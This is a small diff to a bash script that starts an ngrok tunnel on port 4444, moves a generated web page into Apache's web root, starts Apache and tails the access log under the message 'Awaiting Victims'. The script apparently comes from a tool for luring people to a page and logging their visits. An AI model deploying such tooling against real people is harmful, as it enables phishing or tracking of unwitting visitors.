@@ -1,6 +1,7 @@
 #!/bin/bash
 
-#echo "[Starting NGROK Server]"
+echo "[Starting Ngrok]"
+sleep 2
 # run ngrok server
 xterm -e ./ngrok http 4444 & clear
 sleep 5
@@ -51,8 +52,10 @@ echo "<!DOCTYPE html>
 # move webpage to html directory
 mv index.html /var/www/html
 
+echo "[Starting Apache Server]"
+sleep 2
 # start apache2
-service apache2 start
+service apache2 start & clear
 
 echo "Awaiting Victims" > /var/log/apache2/access.log
 xterm -e tail -f /var/log/apache2/access.log &
